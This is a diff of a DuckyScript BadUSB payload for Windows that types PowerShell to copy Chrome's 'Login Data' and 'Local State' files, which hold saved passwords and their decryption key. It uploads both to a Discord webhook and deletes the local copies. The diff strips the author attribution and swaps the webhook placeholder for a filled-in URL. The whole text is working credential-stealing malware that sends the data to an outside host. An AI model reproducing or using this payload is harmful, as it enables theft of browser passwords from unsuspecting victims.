@@ -7,10 +7,6 @@ REM # Category     : Credentials, Exfiltrate                  |
 REM # Target       : Windows                                  |
 REM #                                                         |
 REM ##########################################################
-REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
-REM Description: Copies the chrome login file and sends it to a discord webhook.
-REM Version:	1.0
-REM Category:	Passwords
 DELAY 500
 WINDOWS d
 DELAY 500
@@ -22,7 +18,7 @@ DELAY 800
 LEFTARROW
 ENTER
 DELAY 800
-STRING $hookurl = "insert webhook url"
+STRING $hookurl = "https://discord.com/api/webhooks/1164596165849927792/7ASILUXC1ya92O9OsNFDXhVS_MBFOkTZWlBLVaTtzVwXeO8jz1_IGi5w82goz88vProJ"
 ENTER
 DELAY 300
 STRING $sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; $outputFile1 = "$([System.Environment]::GetFolderPath('Desktop'))\output.txt"; Copy-Item $sourceFile1 $outputFile1; Upload-Discord -file $outputFile1 -text ":)"; Remove-Item $outputFile1; $sourceFile2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"; $outputFile2 = "$([System.Environment]::GetFolderPath('Desktop'))\key.txt"; Copy-Item $sourceFile2 $outputFile2; Upload-Discord -file $outputFile2 -text "Key-File"; Remove-Item $outputFile2
